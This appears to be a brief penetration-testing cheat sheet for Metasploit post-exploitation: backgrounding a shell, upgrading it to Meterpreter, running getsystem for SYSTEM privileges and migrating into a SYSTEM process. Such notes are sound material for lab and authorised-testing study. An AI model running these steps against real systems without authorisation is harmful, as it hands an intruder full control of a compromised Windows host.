# Escalate

## Background the process

```bash
CTRL ^Z  # puts the session in the background
```

## Upgrade shell

```bash
use post/multi/manage/shell_to_meterpreter
set session <SESSION_ID>
exploit
```

## Verify

```bash
getsystem
shell  # open a dos shell
whoami
```

## Migrate

```bash
migrate <NT_AUTHORITY\SYSTEM_ID>
```
